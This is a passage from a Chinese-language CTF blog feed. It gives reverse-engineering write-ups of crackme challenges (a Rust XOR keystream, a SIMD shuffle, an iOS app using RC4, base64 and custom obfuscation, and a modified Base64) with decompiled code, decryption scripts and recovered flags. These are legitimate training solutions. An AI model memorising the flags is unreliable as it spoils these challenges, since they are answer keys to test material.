&#125;        &#125;      &#125;      else      &#123;        Src_2 = Src_3 + 1;      &#125;      v5 = &amp;v9[Src_2 - Src_3];      if ( n0x80 - 9 &gt;= 5 &amp;&amp; n0x80 != 32 )      &#123;        if ( n0x80 &lt; 0x80 )          goto LABEL_28;        n48 = n0x80 &gt;&gt; 8;        if ( n0x80 &gt;&gt; 8 &gt; 0x1F )        &#123;          if ( n48 == 32 )          &#123;            v7 = *(off_7FF7F63C6078 + n0x80) &gt;&gt; 1;          &#125;          else          &#123;            if ( n48 != 48 )              goto LABEL_28;            v7 = n0x80 == 12288;          &#125;        &#125;        else if ( n48 )        &#123;          if ( n48 != 22 )            goto LABEL_28;          v7 = n0x80 == 5760;        &#125;        else        &#123;          v7 = *(off_7FF7F63C6078 + n0x80);        &#125;        if ( (v7 &amp; 1) == 0 )          goto LABEL_28;      &#125;    &#125;    while ( Src_2 != Src_4 );    flag2 = 1;    LOBYTE(v9) = 1;    v45 = v9;LABEL_60:    Src_5 = Src;    goto LABEL_61;  &#125;  v9 = 0;  v5 = 0;  Src_2 = Src;LABEL_28:  if ( Src_2 == Src_4 )  &#123;LABEL_53:    if ( n8 )    &#123;      Size = v5 - v9;      if ( v5 - v9 &lt; 0 )        goto LABEL_74;      goto LABEL_55;    &#125;    flag2 = 1;    LOBYTE(v9) = 1;    v45 = v9;    Size = 0;    goto LABEL_60;  &#125;  while ( 1 )  &#123;    Src_6 = Src_4;    n32 = *(Src_4 - 1);    if ( (n32 &amp; 0x80000000) != 0 )      break;    --Src_4;    if ( n32 - 9 &gt;= 5 )      goto LABEL_43;LABEL_32:    if ( Src_2 == Src_4 )      goto LABEL_53;  &#125;  v20 = *(Src_4 - 2);  if ( v20 &gt;= -64 )  &#123;    Src_4 -= 2;    v23 = v20 &amp; 0x1F;  &#125;  else  &#123;    v21 = *(Src_4 - 3);    if ( v21 &gt;= -64 )    &#123;      Src_4 -= 3;      v22 = v21 &amp; 0xF;    &#125;    else    &#123;      Src_4 -= 4;      v22 = ((*(Src_6 - 4) &amp; 7) &lt;&lt; 6) | v21 &amp; 0x3F;    &#125;    v23 = (v22 &lt;&lt; 6) | v20 &amp; 0x3F;  &#125;  n32 = (v23 &lt;&lt; 6) | n32 &amp; 0x3F;  if ( n32 - 9 &lt; 5 )    goto LABEL_32;LABEL_43:  if ( n32 == 32 )    goto LABEL_32;  if ( n32 &lt; 0x80 )    goto LABEL_73;  n22 = n32 &gt;&gt; 8;  if ( n32 &gt;&gt; 8 &lt;= 0x1F )  &#123;    if ( n22 )    &#123;      if ( n22 != 22 )        goto LABEL_73;      v17 = n32 == 5760;    &#125;    else    &#123;      v17 = *(off_7FF7F63C6078 + n32);    &#125;    goto LABEL_31;  &#125;  if ( n22 == 32 )  &#123;    v17 = *(off_7FF7F63C6078 + n32) &gt;&gt; 1;    goto LABEL_31;  &#125;  if ( n22 == 48 )  &#123;    v17 = n32 == 12288;LABEL_31:    if ( (v17 &amp; 1) == 0 )      goto LABEL_73;    goto LABEL_32;  &#125;LABEL_73:  v5 = &amp;Src_6[v5 - Src_2];  Size = v5 - v9;  if ( v5 - v9 &lt; 0 )  &#123;LABEL_74:    v27 = 0;LABEL_75:    Src_7 = Src_1;    Size_1 = n0x41_2;    sub_7FF7F63BAFA0(v27, Size);  &#125;LABEL_55:  Src_5 = &amp;v9[Src];  if ( v5 == v9 )  &#123;    flag2 = 1;    LOBYTE(v9) = 1;    v45 = v9;  &#125;  else  &#123;    Src_8 = &amp;v9[Src];    v27 = 1;    Src_10 = sub_7FF7F63A17D0(Size, 1);    if ( !Src_10 )      goto LABEL_75;    flag2 = Src_10;    v45 = 0;    Src_5 = Src_8;  &#125;LABEL_61:  memcpy(flag2, Src_5, Size);  if ( 2 * n0x41_2 )    sub_7FF7F63A17E0(Src_1, n0x41_2, 1);  Size_1 = Size;  Src_7 = flag2;  if ( Size == 1 )    sub_7FF7F63BB200(1, 1, &amp;off_7FF7F63BC410);  // &quot;src/main.rs&quot;  if ( !Size )    sub_7FF7F63BB200(0, 0, &amp;off_7FF7F63BC3F8);  // &quot;src/main.rs&quot;  v29 = *flag2;  Buf1_1 = sub_7FF7F63A1800(Size, 1);  if ( !Buf1_1 )    sub_7FF7F63BAFA0(1, Size);  Buf1 = Buf1_1;  for ( i = 0; i != Size; ++i )  &#123;    HIWORD(v33) = (v29 &gt;&gt; 2) ^ (v29 &gt;&gt; 3) ^ (v29 &gt;&gt; 1);    LOWORD(v33) = v29;    v29 = v33 &gt;&gt; 1;    v34 = __ROL1__(v33, 4);    v35 = (4 * (v34 &amp; 0x33)) | (v34 &gt;&gt; 2) &amp; 0x33;    Buf1[i] = *(flag2 + i) ^ (i + ((2 * (v35 &amp; 0x55)) | (v35 &gt;&gt; 1) &amp; 0x55));  &#125;  if ( Size == 42 &amp;&amp; !memcmp(Buf1, &amp;enc, 42u) )  &#123;    sub_7FF7F63A17E0(Buf1, 42, 1);    _err_n_ = &amp;off_7FF7F63BC4A0;    Src = 1;    n8 = 8;    v42 = 0;    sub_7FF7F63A5750(&amp;_err_n_);  &#125;  else  &#123;    sub_7FF7F63A17E0(Buf1, Size, 1);    _err_n_ = &amp;off_7FF7F63BC488;                // &quot;err\n&quot;    Src = 1;    n8 = 8;    v42 = 0;    sub_7FF7F63A5750(&amp;_err_n_);  &#125;  return sub_7FF7F63A17E0(Src_7, Size_1, 1);&#125;</code></pre><p>加密逻辑如下</p><pre><code class="language-c">  v29 = *flag2;  Buf1_1 = sub_7FF7F63A1800(Size, 1);  if ( !Buf1_1 )    sub_7FF7F63BAFA0(1, Size);  Buf1 = Buf1_1;  for ( i = 0; i != Size; ++i )  &#123;    HIWORD(v33) = (v29 &gt;&gt; 2) ^ (v29 &gt;&gt; 3) ^ (v29 &gt;&gt; 1);    LOWORD(v33) = v29;    v29 = v33 &gt;&gt; 1;    v34 = __ROL1__(v33, 4);    v35 = (4 * (v34 &amp; 0x33)) | (v34 &gt;&gt; 2) &amp; 0x33;    Buf1[i] = *(flag2 + i) ^ (i + ((2 * (v35 &amp; 0x55)) | (v35 &gt;&gt; 1) &amp; 0x55));  &#125;</code></pre><p>就对于密文来说就是一个异或而已，但是与之异或的密钥流是和输入的前两个明文有关，也就是上面的v29，然后就可以直接仿写此密钥流的生成逻辑，拿到异或的值，当然也可以动调跟，拿到v35的值，再进行最后一步的生成，最后异或解密也可以</p><p>脚本如下</p><pre><code class="language-python">enc = [ 0x00, 0xA1, 0xFB, 0x53, 0x1C, 0xFA, 0xF0, 0x1B, 0x06, 0x40, 0xD4, 0x8C, 0x16, 0xF4, 0x90, 0x27,        0x42, 0xB9, 0x8B, 0x0F, 0x02, 0xD7, 0x31, 0xB7, 0x26, 0x12, 0x06, 0x7E, 0xAE, 0xDF, 0xDA, 0x68,        0xAF, 0x35, 0xCC, 0xB7, 0xB0, 0xD0, 0x9A, 0x59, 0x2B, 0x0B]v29 = 0x66 + (0x6c &lt;&lt; 8)box = [0] * 42for i in range(42):    h = ((v29 &gt;&gt; 2) ^ (v29 &gt;&gt; 3) ^ (v29 &gt;&gt; 1)) &amp; 0xffff    l = v29 &amp; 0xffff    hl = (h &lt;&lt; 16) | l    v29 = (hl &gt;&gt; 1) &amp; 0xffff    v34 = (((hl &amp; 0xFF) &lt;&lt; 4) | ((hl &amp; 0xFF) &gt;&gt; 4)) &amp; 0xFF    v35 = ((4 * (v34 &amp; 0x33)) | (v34 &gt;&gt; 2) &amp; 0x33) &amp; 0xff    box[i] = (i + ((2 * (v35 &amp; 0x55)) | (v35 &gt;&gt; 1) &amp; 0x55)) &amp; 0xfffor i in range(42):    print(chr((enc[i] ^ box[i]) &amp; 0xff), end=&quot;&quot;)</code></pre><p><strong>flag{1c98572d-7f7b-4fbf-8750-4a2986c695ce}</strong></p><hr><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>如题，就是SIMD</p><p>主函数如下</p><pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)&#123;  Stream *Stream; // rax  size_t n0x40; // rax  __int64 n32; // rax  unsigned __int64 n0x20; // rax  __m128i v8; // xmm2  __m128i v9; // xmm1  char Buffer[16]; // [rsp+20h] [rbp-58h] BYREF  __int128 v11; // [rsp+30h] [rbp-48h]  __int128 v12; // [rsp+40h] [rbp-38h]  __int128 v13; // [rsp+50h] [rbp-28h]  sub_140001010(&quot;Enter flag: &quot;);  Stream = _acrt_iob_func(0);  fgets(Buffer, 64, Stream);  n0x40 = strcspn(Buffer, &quot;\n&quot;);  if ( n0x40 &gt;= 0x40 )    _report_rangecheckfailure();  Buffer[n0x40] = 0;  n32 = -1i64;  do    ++n32;  while ( Buffer[n32] );  if ( n32 == 32 )  &#123;    n0x20 = 0i64;    v8 = _mm_loadu_si128((const __m128i *)&amp;xmmword_1400032F8);    xmmword_140005630 = v11;    xmmword_140005620 = *(_OWORD *)Buffer;    xmmword_140005650 = v13;    v9 = _mm_loadu_si128((const __m128i *)&amp;xmmword_1400032E8);    xmmword_140005640 = v12;    do    &#123;      *(__m128i *)&amp;Buffer[n0x20] = _mm_add_epi8(                                     _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)&amp;Buffer[n0x20]), v8),                                     v9);      n0x20 += 16i64;    &#125;    while ( n0x20 &lt; 0x20 );    if ( !memcmp(Buffer, &quot;cge87k?9&lt;&gt;?@=pss393=&gt;;8@:Cp@DAuH&quot;, 0x20ui64) )      sub_140001010(&quot;Correct! The flag is flag&#123;%s&#125;\n&quot;);    else      puts(&quot;Wrong!&quot;);    return 0;  &#125;  else  &#123;    puts(&quot;Wrong!&quot;);    return 1;  &#125;&#125;</code></pre><p>就是两个指令**<em>mm_add_epi8**和</em><strong>mm_shuffle_epi8</strong>，不是很熟悉，先去网上查了下，add没什么好说的，就是相加，shuffle，是以第二个参数的值作为索引，去第一个参数中取值，取到的值即为打乱后的密文，但是这里要注意，再传参的时候是小端序，不然就这题来说，打乱前和打乱后就没什么区别了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250423133156008.png" alt="image-20250423133156008"></p><p>解密脚本如下</p><pre><code class="language-python">encrypted_flag1 = &quot;cge87k?9&lt;&gt;?@=pss&quot;encrypte_flag1 = encrypted_flag1[::-1]enc1 = list(encrypte_flag1)v9 = [0x10, 0x0F, 0x0E, 0x0D, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01]v8 = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F]for i in range(len(enc1)):    print(chr(ord(enc1[i]) - v9[i % 16]), end=&quot;&quot;)encrypted_flag2 = &quot;393=&gt;;8@:Cp@DAuH&quot;encrypte_flag2 = encrypted_flag2[::-1]enc2 = list(encrypte_flag2)v9 = [0x10, 0x0F, 0x0E, 0x0D, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01]v8 = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F]for i in range(len(enc2)):    print(chr(ord(enc2[i]) - v9[i % 16]), end=&quot;&quot;)</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250423133324027.png" alt="image-20250423133324027"></p><p><strong>flag{cdb0444318e24beb8f374e9181599072}</strong></p><hr><h3 id="re"><a href="#re" class="headerlink" title="re!!!!!"></a>re!!!!!</h3><p>iso逆向。</p><p>一开始想跟字符串，倒着跟踪到main函数，但是发现确实跟到了，但是有点抽象。<br>于是乎，只能从头开始分析，也就是从初始化函数开始</p><p>ViewController.init</p><pre><code class="language-c++">id __fastcall ViewController.init(nibName:bundle:)(__int64 a1, __int64 a2, void *obj_1)&#123;  char *receiver; // x20  char *v5; // x8  char *v6; // x8  NSString obj; // x21  id v9; // x20  objc_super v11; // [xsp+0h] [xbp-30h] BYREF  v5 = &amp;receiver[OBJC_IVAR____TtC9challenge14ViewController_secretKey];  *(_QWORD *)v5 = &#39;akihuraH&#39;;  *((_QWORD *)v5 + 1) = 0xEA00000000006567LL;  v6 = &amp;receiver[OBJC_IVAR____TtC9challenge14ViewController_flagHash];  *(_QWORD *)v6 = 0xD000000000000126LL;  *((_QWORD *)v6 + 1) = 0x8000000100003C20LL;  *(_QWORD *)&amp;receiver[OBJC_IVAR____TtC9challenge14ViewController_magicNumber] = 3735928559LL;  *(_QWORD *)&amp;receiver[OBJC_IVAR____TtC9challenge14ViewController_inputTextField] = 0;  *(_QWORD *)&amp;receiver[OBJC_IVAR____TtC9challenge14ViewController_outputTextField] = 0;  *(_QWORD *)&amp;receiver[OBJC_IVAR____TtC9challenge14ViewController_encryptButton] = 0;  if ( a2 )  &#123;    obj = String._bridgeToObjectiveC()();    a1 = swift_bridgeObjectRelease(a2);  &#125;  else  &#123;    obj = 0;  &#125;  v11.receiver = receiver;  v11.super_class = (Class)type metadata accessor for ViewController(a1);  v9 = objc_msgSendSuper2(&amp;v11, &quot;initWithNibName:bundle:&quot;, obj, obj_1);  objc_release(obj);  objc_release(obj_1);  return v9;&#125;</code></pre><p>这里有看到一个初始化的key：<strong>Haruhikage</strong>。(这里要注意，伪代码中的key不完整，还差两位…)</p><p>然后就开始分析ViewController.encryptButtonClicked()<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507182159035.png" alt="image-20250507182159035"></p><p>这里就是check输出正确flag的地方</p><p>在String里找这个这个提示的时候还看到了一个可疑的字符串<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507182259187.png" alt="image-20250507182259187"></p><p>c2..c3..。都是以这样的形式。</p><p>然后分析这个函数下来，主要逻辑就是获取到输入的flag，先检查是否为空，不为空的话就传到**ViewController.complexEncrypt(<em>:)<strong>函数中进行加密，然后在</strong>ViewController.verifyFlag(</em>:)**函数中进行check。</p><p>加密函数</p><pre><code class="language-c++">__int64 __fastcall ViewController.complexEncrypt(_:)(__int64 a1, __int64 a2)&#123;  __int64 v2; // x20  __int64 v5; // x22  __int64 v6; // x24  char *v7; // x23  __int64 v8; // x19  __int64 v9; // x1  __int64 v10; // x21  __int64 v11; // x19  unsigned __int64 v12; // x1  unsigned __int64 v13; // x20  __int64 _countAndFlagsBits; // x0  void *_object; // x21  Swift::String v16; // kr00_16  __int64 v17; // x19  __int64 v18; // x1  __int64 v19; // x20  __int64 v20; // x19  __int64 v22; // [xsp+0h] [xbp-30h] BYREF  v5 = type metadata accessor for String.Encoding(0);  v6 = *(v5 - 8);  v7 = &amp;v22 - ((*(v6 + 64) + 15LL) &amp; 0xFFFFFFFFFFFFFFF0LL);  v8 = specialized ViewController.rc4Encrypt(_:key:)(// RC4         a1,         a2,         *(v2 + OBJC_IVAR____TtC9challenge14ViewController_secretKey),         *(v2 + OBJC_IVAR____TtC9challenge14ViewController_secretKey + 8));  v10 = v9;  static String.Encoding.utf8.getter();         // UTF8  v11 = String.data(using:allowLossyConversion:)(v7, 0, v8, v10);  v13 = v12;  swift_bridgeObjectRelease(v10);  (*(v6 + 8))(v7, v5);  if ( v13 &gt;&gt; 60 == 15 )  &#123;    _countAndFlagsBits = 0;    _object = 0xE000000000000000LL;  &#125;  else  &#123;    v16 = Data.base64EncodedString(options:)(0);// base64    _object = v16._object;    outlined consume of Data?(v11, v13);    _countAndFlagsBits = v16._countAndFlagsBits;  &#125;  v17 = specialized ViewController.obfuscateString(_:)(_countAndFlagsBits, _object);// obfuscateString  v19 = v18;  swift_bridgeObjectRelease(_object);  v20 = specialized ViewController.transformString(_:)(v17, v19);// transformString  swift_bridgeObjectRelease(v19);  return v20;&#125;</code></pre><p>整体的加密逻辑就是RC4-&gt;base64-&gt;obfuscateString-&gt;transformString</p><p><strong>transformString</strong>函数，有点抽象</p><pre><code class="language-c++">void *__fastcall specialized ViewController.transformString(_:)(__int64 a1, unsigned __int64 a2)&#123;  unsigned __int64 v2; // x8  void *_countAndFlagsBits; // x0  Swift::String_optional v4; // kr00_16  void *_object; // x19  __int64 index; // x21  __int64 v7; // x20  unsigned int n190; // w8  unsigned int v9; // w8  Swift::String v10; // x0  void *_object_1; // x19  Swift::String_optional v12; // kr10_16  int v13; // w10  int v14; // w9  int v15; // w10  int v16; // w13  int v17; // w10  _QWORD v18[2]; // [xsp+8h] [xbp-88h] BYREF  unsigned __int64 v19; // [xsp+18h] [xbp-78h]  __int64 v20; // [xsp+20h] [xbp-70h]  unsigned __int64 v21; // [xsp+28h] [xbp-68h]  void *_object_2; // [xsp+30h] [xbp-60h]  unsigned __int64 v23; // [xsp+38h] [xbp-58h]  _object_2 = 0;  v23 = 0xE000000000000000LL;  v2 = HIBYTE(a2) &amp; 0xF;  if ( (a2 &amp; 0x2000000000000000LL) == 0 )    v2 = a1 &amp; 0xFFFFFFFFFFFFLL;  v18[1] = a1;  v19 = a2;  v20 = 0;  v21 = v2;  swift_bridgeObjectRetain(a2);  v4 = String.Iterator.next()();                // 获取字符串迭代器  _countAndFlagsBits = v4.value._countAndFlagsBits;  _object = v4.value._object;  if ( v4.value._object )  &#123;    index = 0;    while ( !__OFADD__(index, 1) )              // 遍历每个字符    &#123;      v7 = specialized Collection.first.getter(_countAndFlagsBits, _object);// 获取当前字符      _countAndFlagsBits = swift_bridgeObjectRelease(_object);      if ( (index &amp; 1) != 0 )                   // 判断奇偶                                                // 奇数异或 0xBE                                                // 偶数异或 0xEF      &#123;        n190 = v7 ^ 0xBE;        if ( (v7 &amp; &amp;_mh_execute_header) != 0 )          n190 = 190;        if ( n190 &gt;&gt; 11 == 27 )          goto LABEL_30;        if ( n190 &gt; 0x10FFFF )          goto LABEL_27;      &#125;      else      &#123;        n190 = v7 ^ 0xEF;        if ( (v7 &amp; &amp;_mh_execute_header) != 0 )          n190 = 239;        if ( n190 &gt;&gt; 11 == 27 )          goto LABEL_29;        if ( n190 &gt; 0x10FFFF )          goto LABEL_28;      &#125;      if ( n190 &gt; 0x7F )      &#123;        v13 = (n190 &amp; 0x3F) &lt;&lt; 8;        v14 = (n190 &gt;&gt; 6) + v13 + 33217;        v15 = (v13 | (n190 &gt;&gt; 6) &amp; 0x3F) &lt;&lt; 8;        v16 = (n190 &gt;&gt; 18) + ((v15 | (n190 &gt;&gt; 12) &amp; 0x3F) &lt;&lt; 8) - 2122219023;        v17 = (n190 &gt;&gt; 12) + v15 + 8487393;        if ( HIWORD(n190) )          v17 = v16;        if ( n190 &gt;= 0x800 )          v9 = v17;        else          v9 = v14;      &#125;      else      &#123;        v9 = n190 + 1;      &#125;      v18[0] = (v9 + 0xFEFEFEFEFEFEFFLL) &amp; ~(-1LL &lt;&lt; (8 * (4 - (__clz(v9) &gt;&gt; 3))));      v10._countAndFlagsBits = static String._uncheckedFromUTF8(_:)(v18);      _object_1 = v10._object;      String.append(_:)(v10);      swift_bridgeObjectRelease(_object_1);      v12 = String.Iterator.next()();           // 移动到下一个字符      _countAndFlagsBits = v12.value._countAndFlagsBits;      _object = v12.value._object;              // 检查是否结束      ++index;      if ( !v12.value._object )      &#123;        _object = _object_2;        goto LABEL_25;      &#125;    &#125;    __break(1u);LABEL_27:    __break(1u);LABEL_28:    __break(1u);LABEL_29:    __break(1u);LABEL_30:    __break(1u);  &#125;  else  &#123;LABEL_25:    swift_bridgeObjectRelease(v19);    return _object;  &#125;  return _countAndFlagsBits;&#125;</code></pre><p>总的来说就是一个异或，但是在异或完，有个奇怪的逻辑<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507185459524.png" alt="image-20250507185459524"></p><p>可以按照这个逻辑来仿写一个看看输出是什么。这里还要查下__clz()有什么用<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/5ac8852d191b7c5cb09a8107df86a369.png" alt="5ac8852d191b7c5cb09a8107df86a369"></p><p>同构的脚本：</p><pre><code class="language-python">def __clz(x):    return 64 - x.bit_length() if x != 0 else 64for n190 in range(0x00, 0x100):  # 0x00到0xFF    # 处理非ASCII字符（&gt;0x7F）    if n190 &gt; 0x7F:        v13 = (n190 &amp; 0x3F) &lt;&lt; 8        v14 = (n190 &gt;&gt; 6) + v13 + 33217        v15 = (v13 | ((n190 &gt;&gt; 6) &amp; 0x3F)) &lt;&lt; 8        v16 = (n190 &gt;&gt; 18) + ((v15 | ((n190 &gt;&gt; 12) &amp; 0x3F)) &lt;&lt; 8) - 2122219023        v17 = (n190 &gt;&gt; 12) + v15 + 8487393        if n190 &gt; 0xFFFF:            v17 = v16        v9 = v17 if n190 &gt;= 0x800 else v14    else:        v9 = n190 + 1    # 安全计算移位量（确保非负）    shift = 8 * (4 - (__clz(v9) &gt;&gt; 3))    shift = max(0, min(shift, 64))  # 限制在0-64范围内    # 计算掩码    mask = ~(-1 &lt;&lt; shift) if shift &gt; 0 else 0xFFFFFFFFFFFFFFFF    v9 = (v9 + 0xFEFEFEFEFEFEFF) &amp; mask    print(f&quot;&#123;hex(n190)&#125; -&gt; &#123;hex(v9)&#125;&quot;)</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507193410367.png" alt="image-20250507193410367"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/0a355f4c8421f31e5e526b41704d4578.png" alt="0a355f4c8421f31e5e526b41704d4578"></p><p>这样一来就知道了那串可疑字符串中c2，c3的来处了。以及如果是c3开头的，在解密的时候要-0x40.</p><p><strong>obfuscateString</strong>函数</p><pre><code class="language-c++">void *__fastcall specialized ViewController.obfuscateString(_:)(__int64 _countAndFlagsBits, unsigned __int64 _object)&#123;  unsigned __int64 v2; // x8  void *_countAndFlagsBits_1; // x0  Swift::String_optional v4; // kr00_16  void *_object_2; // x19  __int64 v6; // x21  __int64 v7; // x20  __int64 v8; // x8  bool v9; // vf  __int64 v10; // x8  __int64 v11; // x8  bool v12; // nf  unsigned int v13; // w8  Swift::String v14; // x0  void *_object_3; // x19  Swift::String_optional v16; // kr10_16  _QWORD v17[2]; // [xsp+8h] [xbp-78h] BYREF  unsigned __int64 _object_1; // [xsp+18h] [xbp-68h]  __int64 v19; // [xsp+20h] [xbp-60h]  unsigned __int64 v20; // [xsp+28h] [xbp-58h]  void *_object_4; // [xsp+30h] [xbp-50h]  unsigned __int64 v22; // [xsp+38h] [xbp-48h]  _object_4 = 0;  v22 = 0xE000000000000000LL;  v2 = HIBYTE(_object) &amp; 0xF;  if ( (_object &amp; 0x2000000000000000LL) == 0 )    v2 = _countAndFlagsBits &amp; 0xFFFFFFFFFFFFLL;  v17[1] = _countAndFlagsBits;  _object_1 = _object;  v19 = 0;  v20 = v2;  swift_bridgeObjectRetain(_object);  v4 = String.Iterator.next()();  _countAndFlagsBits_1 = v4.value._countAndFlagsBits;  _object_2 = v4.value._object;  if ( v4.value._object )  &#123;    v6 = 0;    while ( !__OFADD__(v6, 1) )    &#123;      v7 = specialized Collection.first.getter(_countAndFlagsBits_1, _object_2);      _countAndFlagsBits_1 = swift_bridgeObjectRelease(_object_2);      v8 = v7;      if ( (v7 &amp; &amp;_mh_execute_header) != 0 )        v8 = 0;      v9 = __OFADD__(v8, v6);      v10 = v8 + v6;      if ( v9 )        goto LABEL_20;      v9 = __OFADD__(v10, 3735928559LL);      v11 = v10 + 3735928559LL;      if ( v9 )        goto LABEL_21;      v12 = -v11 &lt; 0;      v11 = v11;      if ( !v12 )        v11 = --v11;      if ( v11 &lt; 0 )        goto LABEL_22;      if ( (v11 &amp; 0xFFFFFF80) != 0 )        v13 = (((v11 &amp; 0x3F) &lt;&lt; 8) | (v11 &gt;&gt; 6)) + 33217;      else        v13 = v11 + 1;      v17[0] = (v13 + 0xFEFEFEFEFEFEFFLL) &amp; ~(-1LL &lt;&lt; (8 * (4 - (__clz(v13) &gt;&gt; 3))));      v14._countAndFlagsBits = static String._uncheckedFromUTF8(_:)(v17);      _object_3 = v14._object;      String.append(_:)(v14);      swift_bridgeObjectRelease(_object_3);      v16 = String.Iterator.next()();      _countAndFlagsBits_1 = v16.value._countAndFlagsBits;      _object_2 = v16.value._object;      ++v6;      if ( !v16.value._object )      &#123;        _object_2 = _object_4;        goto LABEL_18;      &#125;    &#125;    __break(1u);LABEL_20:    __break(1u);LABEL_21:    __break(1u);LABEL_22:    __break(1u);  &#125;  else  &#123;LABEL_18:    swift_bridgeObjectRelease(_object_1);    return _object_2;  &#125;  return _countAndFlagsBits_1;&#125;</code></pre><p>加密逻辑：+索引index和常数0xDEADBEEF，然后&amp;0xFF</p><p>那么就可以解密了</p><pre><code class="language-python">hex_enc = &quot;c2a7c3b9c2acc3a5c2a2c3b6c391c295c2aac38cc28bc38ac2a6c3aec28bc28fc2a1c3aac287c382c2bfc3b6c282c38ec2b9c3a2c2a13cc28ac3adc2b1c280c2b2c384c28dc3bbc283c396c2b03dc28a3bc2b12cc287c3b0c2852bc282c39ac28432c29320c29d21c29ac392c291c3a1c296c3a06d1866396c256310c299c3946931c291c3917a2e470b632a7811730f65c385&quot;def de_utf(hex_str):    res = bytearray()    i = 0    while i &lt; len(hex_str):        prefix = hex_str[i:i+2]        if prefix == &quot;c2&quot;:            val = int(hex_str[i+2:i+4], 16)            res.append(val)            i += 4        elif prefix == &quot;c3&quot;:            val = int(hex_str[i+2:i+4], 16) + 0x40            res.append(val)            i += 4        else:            val = int(prefix, 16)            res.append(val)            i += 2    return resstep1 = de_utf(hex_enc)for i in range(len(step1)):    step1[i] ^= 0xBE if i % 2 else 0xEFstep2 = de_utf(step1.hex())for i in range(len(step2)):    step2[i] = (step2[i] - i - 0xDEADBEEF) &amp; 0xFFprint(step2.decode(errors=&quot;ignore&quot;))</code></pre><p>解得</p><p>YWRiZTI5NzkzNTg3OTgzMDhjOTExZGQ0NjQ3YTJmNmExM2MwNDJjYzMyNDU5N2UxZWRiYzA4OWE5ZTkwMTVmYmE5</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250507202602256.png" alt="image-20250507202602256"></p><p><strong>flag{N4nd3_H4ruhik4g3_Y4tt4n0?!!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> iOS </tag>
            
            <tag> SIMD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF2025 RE</title>
      <link href="/2025/04/14/TGCTF2025/"/>
      <url>/2025/04/14/TGCTF2025/</url>
      
        <content type="html"><![CDATA[<h1 id="TGCTF2025-RE"><a href="#TGCTF2025-RE" class="headerlink" title="TGCTF2025 RE"></a>TGCTF2025 RE</h1><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>考点总结：魔改Base64</p><p>题目描述：如题 flag格式为HZNUCTF{}</p><p>wp：</p><p>拿到附件先查壳，64位的，没有壳</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241222200148991.png" alt="image-20241222200148991"></p><p>直接ida64分析，拿到伪代码</p><pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char *v3; // rbx  __int64 v4; // rcx  void *v5; // rbx  char Destination[16]; // [rsp+20h] [rbp-28h] BYREF  sub_140001020(&quot;Welcome to HZNUCTF!!!\n&quot;);  sub_140001020(&quot;Plz input your flag:\n&quot;);  v3 = (char *)malloc(0x2Aui64);  sub_140001080(&quot;%s&quot;);  v4 = -1i64;  do    ++v4;  while ( v3[v4] );  if ( v4 == 41 )  &#123;    strncpy_s(Destination, 9ui64, v3, 8ui64);    Destination[8] = 0;    if ( !strcmp(Destination, &quot;HZNUCTF&#123;&quot;) )    &#123;      v5 = (void *)sub_1400010E0(v3);      if ( !strcmp((const char *)v5, &quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&quot;) )      &#123;        sub_140001020(&quot;Congratulation!!!&quot;);        free(v5);        exit(1);      &#125;      sub_140001020(&quot;wrong_wrong!!!&quot;);      free(v5);      exit(1);    &#125;    sub_140001020(&quot;wrong head!!!&quot;);    free(v3);    exit(1);  &#125;  sub_140001020(&quot;wrong len!!!&quot;);  free(v3);  return 0;&#125;</code></pre><p>逻辑很简单，输入flag，先检查长度，然后检查头，再接着就是加密了，加密函数就是<strong>sub_1400010E0</strong>函数，点进去看发现是一个魔改的base64，换了表，同时在索引取值的时候也进行了处理，一个类似于凯撒的处理，加24。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241222200549750.png" alt="image-20241222200549750"></p><p>加密完了就直接比对结果了</p><p>那么在解base64编码的时候，可以先把偏移后的码表输出，然后再用赛博厨子一把梭</p><pre><code class="language-python">table = &quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;real_table = [0] * 64for i in range(64):    num = (i + 24) % 64  # 使用取模运算，确保索引在范围内    real_table[i] = ord(table[num])for i in range(64):    print(chr(real_table[i]), end=&quot;&quot;)</code></pre><p>拿到表：<strong>53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebIGLp&#x2F;+Wn7uqX8FQ2JDR1c0M6U</strong></p><p>然后解编码</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20241222200733698.png" alt="image-20241222200733698"></p><p><strong>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</strong></p><hr><h3 id="XTEA"><a href="#XTEA" 